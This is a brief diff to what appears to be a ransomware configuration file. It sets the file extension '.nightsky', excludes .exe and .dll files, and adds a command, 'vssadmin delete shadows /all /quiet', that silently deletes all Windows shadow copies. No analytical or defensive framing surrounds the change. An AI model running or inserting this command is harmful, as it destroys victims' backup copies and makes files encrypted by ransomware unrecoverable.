@@ -1,4 +1,6 @@
 file_extension: .nightsky
+command:
+  - vssadmin delete shadows /all /quiet
 exclude:
   - .exe
   - .dll
